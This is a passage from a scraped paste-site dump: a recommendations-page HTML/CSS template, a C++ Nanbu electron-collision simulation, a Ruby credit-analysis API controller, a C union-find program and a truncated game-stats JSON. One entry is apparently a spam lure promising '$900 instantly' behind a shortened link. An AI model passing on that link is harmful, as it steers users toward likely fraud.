    border-bottom: 2px solid var(--accents);
    font-family: inherit;
    font-size: .95rem;
    color:var(--text);
    background-color: transparent;
    text-align: left;
    transition-duration: .2s;
    cursor:pointer;
}

#filters button:hover {color:var(--links-hover)}

#filters .is-checked:before {
    content: '';
    position: absolute;
    inset: 6px auto auto 0;
    width: .4rem;
    aspect-ratio: 1 / 1;
    border-radius: 100%;
    background-color: var(--accents);
}

#filters .is-checked{
    position: relative;
    margin-left: 1rem;
    padding-left:  1rem;
    border-bottom: 0;
    cursor: pointer;
}

#filters-rating span{
    color:var(--accents);
}

/* main */

#main-wrapper {
    width: calc(100% - 18rem);
    margin-left: 18rem;
}

/* header */

#main-header {
    padding:6rem 3rem;
    border-bottom: 1px solid var(--borders);
    background-color: var(--boxes-background);
}

#header-content {
    display: flex;
    justify-content: center;
    margin: auto;
    max-width: 35rem;
}

#header-aside {margin-right: 2rem;}

.header-image {
    width: 3.3rem;
    aspect-ratio: 1 / 1;
    object-fit:cover;    
    border-radius: 4px;
}

figure.header-image {margin-bottom: .5rem;}

#squares-wrapper {
    display: flex;
    justify-content: space-between;
}

.color-square {
    width: 1.3rem;
    aspect-ratio: 1 / 1;
    border-radius: 4px;
}

.color-square:first-of-type {background-color:var(--first-header-square);}

.color-square:nth-of-type(2) {
background-color:var(--second-header-square);}

#page-title {
    font:500 1.5rem 'montserrat underline', sans-serif;
    margin-bottom:1rem
}

#description {
    border: 1px solid var(--borders);
    padding: .5rem 1.5rem;
    font-style: italic;
    text-align: center;
    border-radius: 4px;
}

/* rec content */

#rec-wrapper {
    width: 100%;
    margin:7rem auto 0;
}

/* rec boxes */

.rec-item {
    width: calc(50% - 7rem);
    min-height: 11rem;
    margin:0 3rem 7rem;
}

/* rating */

.rec-rating {
    font-size: 1.5rem;    
    position: absolute;
    inset:0 -2rem auto auto
}

.rec-rating {color:#aaa}

.one-star .rec-rating li:nth-of-type(1),
.two-stars .rec-rating li:nth-of-type(-n+2),
.three-stars .rec-rating li:nth-of-type(-n+3),
.four-stars .rec-rating li:nth-of-type(-n+4),
.five-stars .rec-rating li:nth-of-type(-n+5)
{
    color: var(--accents);
}

.rec-title {
    position: relative;
    text-indent: 2.5rem;
    font:400 1.2rem 'karla', sans-serif;
    line-height: 130%;
    margin: 0;
}

.rec-title:before {
    content: '';
    position:absolute;
    inset:-.3rem auto auto 0;
    width: 1.5rem;    
    aspect-ratio: 1 / 1;
    border-radius: 4px;
    background-color: var(--accents);
}

.rec-author {
    position: relative;
    margin:.5rem 0 0 2rem;
    padding-left: 1.3rem;
    font:400 .9rem 'karla', sans-serif;
}

.rec-author:before {
    content: '';
    position: absolute;
    inset:.35rem auto auto 0;
    width: .5rem;
    aspect-ratio: 1 / 1;
    border-radius: 100%;
    background-color: var(--accents);
}

.rec-description {
    margin-top: 2rem;
    padding:0 1rem;
    line-height: 140%;
    border: 1px solid var(--borders);
    border-bottom: 3px solid var(--accents);
    border-radius: 4px;
    background-color: var(--boxes-background);
}

.rec-details {margin-top: 2rem;max-width: 100%;}

.rec-details ul {
    display: flex;
    justify-content: center;
    flex-wrap: wrap;
}

.rec-details ul li {
    position: relative;
    margin: .2rem 0 .2rem 2.5rem ;
}

.rec-details ul li:after {
    content: '';
    position: absolute;
    inset: .45rem auto auto -1.5rem;
    width: .5rem;
    aspect-ratio: 1 / 1;
    border-radius: 100%;
    background-color: var(--accents);
}   

.rec-details ul li:first-of-type {margin-left: 0;}

.rec-details ul li:first-of-type:after {display: none}

.rec-notes {
    margin-top: 2rem;
    padding:0 1rem;
    font-size: .95rem;
    line-height: 140%;
    font-style: italic;
    color: var(--note-text);
    border: 1px solid var(--borders);
    border-top: 4px solid var(--accents);
    border-radius: 4px;
    background-color: var(--boxes-background);
}

/* MEDIA */

@media only screen and (min-width:0px) and (max-width:1200px) {

    #main-wrapper {
        width: 100%;
        margin:0
    }

    #filters-wrapper {
        transform: translateX(-18rem);
        transition: 2s ease;
    }

    .hamburger {
        display: block;
    }
}

</style>    

</head>
</head>
<body>

<!-- background square -->
<div id=""background-square""></div>

<!-- container -->

<section id=""container"">

<input type=""checkbox"" id=""hamburger-checkbox"">
<label class=""hamburger"" for=""hamburger-checkbox"">☰</label>

<!-- filters start -->
<aside id=""filters-wrapper"">
    
    <!-- filters image -->
    <figure class=""filters-image""><img src=""IMAGE URL"" alt="""" class=""filters-image""></figure>
    
    <!-- filters content -->
    <section id=""filters-content"">

        <h2 id=""filters-title""><span>filters title</span></h2>

        <!-- filters -->
        <section id=""filters"">

            <div class=""button-group"" data-filter-group=""one"">
                <h3 class=""button-group-title"">filter title</h3>

                <button class=""button is-checked"" data-filter=""""><span>all</span></button>
                <button class=""button"" data-filter="".filter-a""><span>filter a</span></button>

                <button class=""button"" data-filter="".filter-b""><span>filter b</span></button>
            </div>
            
            <div class=""button-group"" data-filter-group=""one"" id=""filters-rating"">
                <h3 class=""button-group-title"">rating</h3>

                <button class=""button is-checked"" data-filter="""">all</button>
                <button class=""button"" data-filter="".three""><span>★</span></button>
                <button class=""button"" data-filter="".three""><span>★★</span></button>
                <button class=""button"" data-filter="".three""><span>★★★</span></button>
                <button class=""button"" data-filter="".three""><span>★★★★</span></button>
                <button class=""button"" data-filter="".three""><span>★★★★★</span></button>
            </div>

        </section><!--filters end-->
    </section> <!-- filters content -->
</aside>
<!-- filters wrapper end -->

<!-- recs container -->
<main id=""main-wrapper"">

<!-- header start -->
<header id=""main-header"">

    <!-- header -->
    <section id=""header-content"">

        <aside id=""header-aside"">
            <!-- header image -->
            <figure class=""header-image""><img src=""IMAGE URL"" alt="""" class=""header-image""></figure>

            <!-- color squares -->
            <div id=""squares-wrapper"">
                <div class=""color-square""></div>
                <div class=""color-square""></div>
            </div>      
        </aside>

        <!-- header content -->
        <section id=""header-inside"">
            <!-- page title -->
            <h1 id=""page-title"">page title</h1>

            <!-- page description -->
            <article id=""description"">
                <p>page description</p>
            </article>
        </section>
        <!-- header content end -->

    </section>
    <!-- header end -->

</header>
<!-- header end -->

<!-- rec wrapper -->
<section id=""rec-wrapper"">

    <!-- customize star rating:
        
        find: <article class=""rec-item star-rating"">

        change 'star-rating' to one of the below, depending on how many stars you want it to have:

        one-star
        two-stars
        three-stars
        four-stars
        five-stars

        example:
        
        <article class=""rec-item four-stars"">

        rec template:
        
        <article class=""rec-item star-rating"">
            
            <h2 class=""rec-title""><a href="""" target=""_blank"">rec title</a></h2>

            <h3 class=""rec-author""><a href="""" target=""_blank"">author</a></h3>

            <article class=""rec-description"">
                <p>rec description</p>
            </article>

            <article class=""rec-details""><ul>
                <li>genre</li>
                <li>word count</li>
                <li>rating</li>
            </ul></article>

            <article class=""rec-notes"">
                <p>rec notes</p>
            </article>
            
            <article class=""rec-rating"">
                <li>★</li>
                <li>★</li>
                <li>★</li>
                <li>★</li>
                <li>★</li>
            </article>

        </article>

    -->

    <!-- rec item start -->
    <article class=""rec-item star-rating"">
        
        <!-- rec title -->
        <h2 class=""rec-title""><a href="""" target=""_blank"">rec title</a></h2>

        <!-- rec author -->
        <h3 class=""rec-author""><a href="""" target=""_blank"">author</a></h3>

        <!-- rec descrption -->
        <article class=""rec-description"">
            <p>rec description</p>
        </article>

        <!-- rec details -->
        <article class=""rec-details""><ul>
            <li>genre</li>
            <li>word count</li>
            <li>rating</li>
        </ul></article>

        <!-- rec notes -->
        <article class=""rec-notes"">
            <p>rec notes</p>
        </article>
        
        <!-- rec star rating -->
        <article class=""rec-rating"">
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
        </article>
    </article>
    <!-- rec item end -->

    <!-- rec item start -->
    <article class=""rec-item star-rating"">
        
        <!-- rec title -->
        <h2 class=""rec-title""><a href="""" target=""_blank"">rec title</a></h2>

        <!-- rec author -->
        <h3 class=""rec-author""><a href="""" target=""_blank"">author</a></h3>

        <!-- rec descrption -->
        <article class=""rec-description"">
            <p>rec description</p>
        </article>

        <!-- rec details -->
        <article class=""rec-details""><ul>
            <li>genre</li>
            <li>word count</li>
            <li>rating</li>
        </ul></article>

        <!-- rec notes -->
        <article class=""rec-notes"">
            <p>rec notes</p>
        </article>
        
        <!-- rec star rating -->
        <article class=""rec-rating"">
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
        </article>
    </article>
    <!-- rec item end -->

    <!-- rec item start -->
    <article class=""rec-item star-rating"">
        
        <!-- rec title -->
        <h2 class=""rec-title""><a href="""" target=""_blank"">rec title</a></h2>

        <!-- rec author -->
        <h3 class=""rec-author""><a href="""" target=""_blank"">author</a></h3>

        <!-- rec descrption -->
        <article class=""rec-description"">
            <p>rec description</p>
        </article>

        <!-- rec details -->
        <article class=""rec-details""><ul>
            <li>genre</li>
            <li>word count</li>
            <li>rating</li>
        </ul></article>

        <!-- rec notes -->
        <article class=""rec-notes"">
            <p>rec notes</p>
        </article>
        
        <!-- rec star rating -->
        <article class=""rec-rating"">
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
        </article>
    </article>
    <!-- rec item end -->

    <!-- rec item start -->
    <article class=""rec-item star-rating"">
        
        <!-- rec title -->
        <h2 class=""rec-title""><a href="""" target=""_blank"">rec title</a></h2>

        <!-- rec author -->
        <h3 class=""rec-author""><a href="""" target=""_blank"">author</a></h3>

        <!-- rec descrption -->
        <article class=""rec-description"">
            <p>rec description</p>
        </article>

        <!-- rec details -->
        <article class=""rec-details""><ul>
            <li>genre</li>
            <li>word count</li>
            <li>rating</li>
        </ul></article>

        <!-- rec notes -->
        <article class=""rec-notes"">
            <p>rec notes</p>
        </article>
        
        <!-- rec star rating -->
        <article class=""rec-rating"">
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
            <li>★</li>
        </article>
    </article>
    <!-- rec item end -->

</section>
<!-- rec wrapper end -->

</main>
<!-- recs container end -->
</section><!-- container -->

<!-- don't touch -->
<div style=""position: fixed;inset: auto 1rem 1rem auto;font-size: .9rem;""><a style=""color:var(--text)"" href=""https://southcodes.tumblr.com"" target=""_blank"">sc</a></div>

<!-- query -->
<script src=""https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js""></script>

<!-- font awesome icons font -->
<script src=""https://kit.fontawesome.com/0993e30c04.js"" crossorigin=""anonymous""></script>

<!-- isotope -->
<script src=""https://unpkg.com/isotope-layout@3/dist/isotope.pkgd.min.js""></script>

<script type=""text/javascript"">
    $(document).ready( function() {
     // init Isotope
     var $grid = $('#rec-wrapper').isotope({
       itemSelector: '.rec-item'
     });
     // store filter for each group
     var filters = {};
     
     $('#filters').on( 'click', '.button', function() {
       var $this = $(this);
       // get group key
       var $buttonGroup = $this.parents('.button-group');
       var filterGroup = $buttonGroup.attr('data-filter-group');
       // set filter for group
       filters[ filterGroup ] = $this.attr('data-filter');
       // combine filters
       var filterValue = concatValues( filters );
       // set filter for Isotope
       $grid.isotope({ filter: filterValue });
     });
     
     // change is-checked class on buttons
     $('.button-group').each( function( i, buttonGroup ) {
       var $buttonGroup = $( buttonGroup );
       $buttonGroup.on( 'click', 'button', function() {
         $buttonGroup.find('.is-checked').removeClass('is-checked');
         $( this ).addClass('is-checked');
       });
     });
     
    });
    // flatten object by concatting values
    function concatValues( obj ) {
     var value = '';
     for ( var prop in obj ) {
       value += obj[ prop ];
     }
     return value;
    }
</script>
</body>
</html>"
QtX2PJAX,⭐EARN $900 INSTANTLY 2025 MI,TimeAndLocation,JavaScript,Tuesday 8th of April 2025 06:28:05 PM CDT," 
Pdf https://surl.li/lgybtn


JKKGdw2HvV
"
0VrHjGy6,Coulomb_Nanbu,phystota,C++,Tuesday 8th of April 2025 06:01:10 PM CDT,"#include <iostream>
#include <random>
#include <fstream>

#include <math.h>
#include <tgmath.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

#define n_e 10000
#define V_0 30000.0     // max velocity using to generate random distribution ---- doesn't work -> produces skew distribution???
#define Emin 0.0
#define Emax 200.0
#define E_average 100.0 // electron sampling energy
#define bin_width 0.5
#define m_e 9.1E-31 // electron mass in kg
#define k_b 1.38E-23 // Boltzmann constant
#define q 1.6E-19 // elementary charge    
#define N ( (int)((Emax-Emin)/bin_width) ) // add 1 to include E_max if needed?
#define P 0.99
#define time 5.0E-6
#define dt 1.0E-8
#define steps time/dt
#define Coulomb_log 15.0 // Coulomb logarithm calculated based on Nanmbu paper
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Volume 1.0E-14 // volume, m-3

double solve_A(double s) {

    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double error = 1.0E-7; // accuracy

    for (int i = 0; i < 1000; i++){

        double f = 1.0/tanh(A) - 1.0/A - exp(-s);

        if (abs(f) < error) break;

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        A -= f/dfdA;

    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided = false;

    //initialization function // void func(Type0& t) → means the function expects a reference to variable t of type0
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis) {
        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2 * dis(gen) - 1.0;   
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 
        
        energy = E_average*dis(gen);
        
        double speed = sqrt(2*energy*q/m_e);

        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;

    }

};

int main() {

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram

    clock_t start = clock();

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);

    std::random_device rd1;
    std::mt19937 gen1(rd1());
    std::uniform_int_distribution<int> pair(0, n_e-1);

    std::ofstream file0(""velocities.dat"");    
    if (!file0.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file1(""energies.dat"");    
    if (!file1.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    
    std::ofstream file2(""energies_final.dat"");    
    if (!file2.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }

    std::ofstream file3(""histo_random.dat"");    
    if (!file3.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""histo_maxwell.dat"");    
    if (!file4.is_open()) {
        std::cerr << ""Error opening file!"" << std::endl;
        return 1;
    }
    file4 << std::fixed << std::setprecision(10);   

    std::ofstream file5(""mean_energy.dat"");        
            


    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // for (int i = 0; i < N; i++){
    //     std::cout << i << "" "" << histo_random.at(i) << ""\n""; // using vector.at allows to access elements with boundary checkings
    // }


    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){\
        double bin_start = Emin + i*bin_width;
        file3 << bin_start << "" "" <<  bin_start*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // E*f(E)
    }

    // for (int i = 0; i < static_cast<int>(4/0.1)+1; i++){
    //     double s = i*0.1;
    //     std::cout << ""s = "" << s << "", "" << ""Solution: A = "" << solve_A(s) << ""\n"";
    // }

    double energy_sum = 0.0;

    for (int t = 0; t < steps; t++){
        
        std::cout << ""timestep remains: "" << steps - t << "" "" << ""deltaE: "" << ""\n"";
        std::ostringstream filename;
        filename << ""Coulomb_data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

        std::ofstream file(filename.str());
        if (!file.is_open()){
        std::cerr << ""Error opening file: "" << filename.str() << std::endl;
        return 1;
        }

        // setting flags to false each timestep
        for (int j = 0; j < n_e; j++){
            electrons.at(j).collided = false;
        }

        for (int i = 0 ; i < n_e; i++){
            if (dis(gen) < P) {
                int partner = -1;
                int attempts = 0;

                while (attempts < n_e){
                    int candidate = pair(gen1);
                    if (candidate != i && !electrons.at(candidate).collided){
                        partner = candidate;
                        break;
                    }
                    attempts++;
                }

                if (partner != -1) {
                    electrons.at(i).collided = true;
                    electrons.at(partner).collided = true;
                

                // std::cout << partner << ""\n"";

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);                

                // ----   Collision energy redistribution module

                // --- initial energy of partiecles

                double E0_1 = electrons[i].energy;
                double E0_2 = electrons[partner].energy;

                // first particle X Y Z initial velocities
                double V0_x_1 = electrons[i].vx;
                double V0_y_1 = electrons[i].vy;
                double V0_z_1 = electrons[i].vz;


                // second particle X Y Z initial velocities
                double V0_x_2 = electrons[partner].vx;
                double V0_y_2 = electrons[partner].vy;
                double V0_z_2 = electrons[partner].vz;


                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);
                double V0_rel_normal = sqrt(V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);


                // calcluating h for equations 20a, 20b (Nanbu1995)

                double eps = 2*M_PI*R1;

                double h_x = V0_rel_normal*cos(eps);
                double h_y = -(V0_rel_y*V0_rel_x*cos(eps) + V0_rel*V0_rel_z*sin(eps))/V0_rel_normal;
                double h_z = -(V0_rel_z*V0_rel_x*cos(eps) - V0_rel*V0_rel_y*sin(eps))/V0_rel_normal;


                //  calculating s (Nanbu1995 eq 19)

                double s = Coulomb_log/(4.0*M_PI) * pow((q*q/(epsilon_0*(m_e/2))),2) * (n_e/Volume) * pow(V0_rel,-3) * dt;
                double A = solve_A(s);




                // calculating cos(khi) (Nanbu1995 eq 17)
                double cos_khi = 0.0;
                double sin_khi = 0.0;
                
                if (s < 1.0E-2) {// taking care of small s  
                    cos_khi = 1.0 + s*log(R1);    
                }
                else {
                    cos_khi = (1.0/A)*log(exp(-A) + 2.0*R1*sinh(A));
                    // std::cout << cos_khi << ""\n"";
                }

                sin_khi = sqrt(1.0 - cos_khi*cos_khi);



                //calculating final velocity of first particle

                double V_x_1 = V0_x_1 - 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
                double V_y_1 = V0_y_1 - 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
                double V_z_1 = V0_z_1 - 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //calculating final velocity of second particle

                double V_x_2 = V0_x_2 + 0.5*(V0_rel_x*(1.0-cos_khi) + h_x*sin_khi);
                double V_y_2 = V0_y_2 + 0.5*(V0_rel_y*(1.0-cos_khi) + h_y*sin_khi);
                double V_z_2 = V0_z_2 + 0.5*(V0_rel_z*(1.0-cos_khi) + h_z*sin_khi);

                double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);

                // calculating final energies of first and second colliding particles

                //redistributing energy
                electrons[i].energy = V_1*V_1*m_e/(2.0*q);
                electrons[partner].energy = V_2*V_2*m_e/(2.0*q);       

                //redistributing velocity
                electrons[i].vx = V_x_1;
                electrons[i].vy = V_y_1;
                electrons[i].vz = V_z_1;

                electrons[partner].vx = V_x_2;
                electrons[partner].vy = V_y_2;
                electrons[partner].vz = V_z_2;

                // --- collision energy redistrubution module ends   

                energy_sum += E0_1 + E0_2 - electrons[i].energy - electrons[partner].energy;
                 
                }

            }
        }

        double total_energy = 0.0;
        for (int i = 0; i < n_e; i++){
            total_energy += electrons[i].energy;
            int bin = (int)( (electrons[i].energy - Emin)/bin_width );
            if (bin >=0 && bin < N)
            histo_maxwell[bin]++;
        }

        file5 << t*dt << "" "" << total_energy << ""\n"";

        for (int i = 0; i < N; i++){
            double bin_start = Emin + i*bin_width;
            file << bin_start << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
            histo_maxwell[i] = 0;
        }

        file.close();

    }
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    for (int i = 0; i < histo_maxwell.size(); i++){
        double bin_start = Emin + i*bin_width;
//        printf(""%5.1f - %5.1f\t%d\n"", bin_start, bin_start + bin_width, histo_maxwell[i]);
        file4 << bin_start << "" "" <<  bin_start*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // E*f(E)
    }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";
    std::cout << ""Total energy change: "" << energy_sum << ""\n"";


    return 0;


}"
yYA5Ff3q,Untitled,guiiiiiiii,Ruby,Tuesday 8th of April 2025 04:35:39 PM CDT,"class IntegracaoAnaliseCredito::V1::IntegracoesController < ActionController::Base

  around_action :valida_token_e_tenant, except: :autenticar

  skip_forgery_protection

  def autenticar
    login_extension = params[:login_extension]

    GerenciadorConexao.conecta Tenant.find_by(login_extension: login_extension)&.name do
      Empresa.logada = Empresa.find_by(extensao_login: login_extension) or return render(json: { error: 'Extensão de login inválida.' }, status: :unauthorized)

      autenticacao = AutenticacaoIntegracaoAnaliseCredito.find_by_cnpj params[:cnpj]

      if autenticacao&.token == params[:hash]
        payload = { exp: 24.hours.from_now.to_i, cnpj: params[:cnpj], login_extension: login_extension }
        token = JWT.encode(payload, params[:hash])

        render json: { token: token }, status: :ok
      else
        render json: { error: 'Autenticação inválida' }, status: :unauthorized
      end
    end
  end

  def meucrediario_vendas
    return unless valida_parametros_requisicao(%i[dataInicio horaIni dataFim horaFim itensPorPagina pagina])

    data_inicial, data_final, por_pagina, pagina = trata_parametros
    pessoa = busca_pessoa(params[:cpf])

    if pessoa.nil? && params[:cpf].present?
      return render json: { error: 'CPF/CNPJ inválido' }, status: :bad_request
    end

    config = busca_ou_cria_configuracao
    vendas_agrupadas = buscar_vendas_agrupadas(config, data_inicial, data_final, pessoa_id: pessoa&.id)

    render_vendas_paginadas vendas_agrupadas, pagina, por_pagina
  end

  def meucrediario_vendas_conferencia
    cpf_cnpj = params[:cpfCnpj]
    return render(json: { error: 'CPF/CNPJ não informado' }, status: :bad_request) unless cpf_cnpj.present?

    return unless valida_parametros_requisicao(%i[dataInicio horaIni dataFim horaFim itensPorPagina pagina])

    data_inicial, data_final, por_pagina, pagina = trata_parametros
    pessoa = busca_pessoa(cpf_cnpj)
    return render(json: { error: 'CPF/CNPJ inválido' }, status: :bad_request) if pessoa.nil?

    config = busca_ou_cria_configuracao
    vendas_agrupadas = buscar_vendas_agrupadas(config, data_inicial, data_final, pessoa_id: pessoa.id, conferencia: true)

    render_vendas_paginadas(vendas_agrupadas, pagina, por_pagina)
  end

  private

  def busca_pessoa cpf_cnpj
    return nil if cpf_cnpj.blank?
    Pessoa.find_by_cpf_cnpj(cpf_cnpj)
  end

  def busca_ou_cria_configuracao
    ConfiguracaoIntegracaoAnaliseCredito.first || ConfiguracaoIntegracaoAnaliseCredito.new(
      categoria: ConfiguracaoIntegracaoAnaliseCredito::DEPARTAMENTO_PRODUTO,
      formas_pagamentos: FormaPagamento.a_prazo,
      filiais: Filial.ativa
    )
  end

  def buscar_vendas_agrupadas config, data_inicial, data_final, pessoa_id:, conferencia: false
    todas_vendas = []
    filiais = ConfiguracaoIntegracaoAnaliseCredito.exists? ? config.filiais.ativa : Filial.ativa

    filiais&.each do |filial|
      consulta = ApiAnaliseCredito::MeuCrediario::Consulta.new(config, filial)

      vendas = if conferencia
                 consulta.titulos_sem_documento(data_inicial, data_final, { pessoa_id: pessoa_id })
               else
                 consulta.movimentacoes_vendas(data_inicial, data_final, pessoa_id.present? ? { pessoa_id: pessoa_id } : {})
               end

      todas_vendas.concat(vendas)
    end

    params_vendas = ApiAnaliseCredito::MeuCrediario::JsonVendas.new(todas_vendas).gera
    params_vendas[:vendas]
  end

  def render_vendas_paginadas vendas, pagina, por_pagina
    vendas_paginadas = vendas.paginate(page: pagina, per_page: por_pagina)

    render json: {
      itens: vendas_paginadas,
      paginacao: {
        pagina_atual: vendas_paginadas.current_page,
        por_pagina: vendas_paginadas.per_page,
        total_paginas: vendas_paginadas.total_pages,
        total_itens: vendas_paginadas.total_entries,
        itens_na_pagina: vendas_paginadas.length
      }
    }, status: :ok
  end

  def trata_parametros
    por_pagina = params[:itensPorPagina].to_i
    pagina = (params[:pagina].presence || 1).to_i

    data_hora_inicial = ""#{params[:dataInicio]} #{params[:horaIni]}"".to_time
    data_hora_final = ""#{params[:dataFim]} #{params[:horaFim]}"".to_time

    [data_hora_inicial, data_hora_final, por_pagina, pagina]
  end

  def valida_parametros_requisicao parametros
    parametros.each do |param|
      unless params[param].present?
        render json: { error: ""Parâmetro #{param} não informado"" }, status: :bad_request
        return false
      end
    end

    por_pagina = params[:itensPorPagina].to_i
    unless (1..500).include?(por_pagina)
      render json: { error: 'Parâmetro itensPorPagina inválido (deve estar entre 1 e 500)' }, status: :bad_request
      return false
    end

    true
  end

  def valida_token_e_tenant
    token = request.headers[:Authorization]
    login_extension = params[:login_extension]

    tenant = Tenant.ativo.find_by_login_extension login_extension
    return render json: { error: 'Extensão de login inválida' }, status: :unauthorized unless tenant

    GerenciadorConexao.conecta tenant.name do
      Empresa.logada = Empresa.find_by(extensao_login: login_extension) or return render(json: { error: 'Extensão de login inválida' }, status: :unauthorized)

      token_privado = AutenticacaoIntegracaoAnaliseCredito.first&.token

      begin
        JWT.decode(token, token_privado, true)
        yield
      rescue JWT::ExpiredSignature
        render json: { error: 'Token expirado' }, status: :unauthorized
      rescue JWT::DecodeError
        render json: { error: 'Token inválido' }, status: :unauthorized
      rescue => e
        render plain: 'Erro interno do servidor.', status: :unauthorized
      ensure
        Empresa.logada = Filial.logada = Usuario.logado = nil
      end
    end
  end
end
"
73bwD4dt,ex_4.c,Miha_Ch,C,Tuesday 8th of April 2025 03:52:26 PM CDT,"#include <stdio.h>

#define MAX_PEOPLE 100000

int parent[MAX_PEOPLE + 1];
int group_size[MAX_PEOPLE + 1];

void begin_group() {
    for (int i = 1; i <= MAX_PEOPLE; i++) {
        parent[i] = i;
        group_size[i] = 1;
    }
}

int find_by_path_compression(int person_num) {
    if (parent[person_num] != person_num) {
        parent[person_num] = find_by_path_compression(parent[person_num]);
    }
    return parent[person_num];
}

void groups_marger(int friend1, int friend2) {
    int root_friend1 = find_by_path_compression(friend1);
    int root_friend2 = find_by_path_compression(friend2);

    if (root_friend1 != root_friend2) {
        if (group_size[root_friend1] < group_size[root_friend2]) {
            parent[root_friend1] = root_friend2;
            group_size[root_friend2] += group_size[root_friend1];
        } else {
            parent[root_friend2] = root_friend1;
            group_size[root_friend1] += group_size[root_friend2];
        }
    }
}

int get_friends_count(int x) {
    int root = find_by_path_compression(x);
    return group_size[root] - 1;
}

int main() {
    int N, M;

    printf(""Enter number of people (N) and number of frienships (M): "");

    if (scanf(""%d %d"", &N, &M) != 2 || N <= 0 || N > MAX_PEOPLE || M < 0) {
        printf(""Invalid input.\n"");
        return 1;
    }

    begin_group(); // Union Find

    printf(""Please enter %d friendships. In every row: <person_num_1> <person_num_2>\n"", M);

    for (int i = 0; i < M; i++) {
        int a, b;
        if (scanf(""%d %d"", &a, &b) != 2 || a < 1 || a > N || b < 1 || b > N) {
            printf(""invalid friendship number: %d %d\n"", a, b);
            continue;
        }
        groups_marger(a, b);
    }

    int query;
    while (scanf(""%d"", &query) != EOF) {
        printf(""Enter the number of the person for whom you want to see the number of friends (or nter 0 to exit): "");
        if (query == 0) break;

        if (query < 1 || query > N) {
            printf(""Invalid person name: %d\n"", query);
        } else {
            printf(""%d\n"", get_friends_count(query));
        }
    }

    return 0;
}"
jYLdkRvb,Stats,Danulsan,JSON,Tuesday 8th of April 2025 03:39:43 PM CDT,"{
    ""SteamId"": 76561198021051512,
    ""Name"": ""ZLGAdmin"",
    ""TribeName"": ""ZLGEvent"",
    ""QuestsCompleted"": 0,
    ""DailyQuestsCompleted"": 0,
    ""WeeklyQuestsCompleted"": 0,
    ""TotalQuestsCompleted"": 0,
    ""PlayerKills"": 0,
    ""PlayerDeaths"": 0,
    ""WildDinoKills"": 8,
    ""TamedDinoKills"": 0,
    ""BossKills"": 0,
    ""K/D"": 0.00,
    ""MinutesPlayed"": 117,
    ""TotalDeaths"": 2,
    ""PvPDamage"": 0,
    ""TamedDinos"": 0,
    ""RareTamedDinos"": 0,
    ""RareDinoKills"": 0,
    ""SuperRareDinoKills"": 0,
    ""ServerEventsCompleted"": 0,
    ""MissionsCompleted"": 0,
    ""MissionsFailed"": 0,
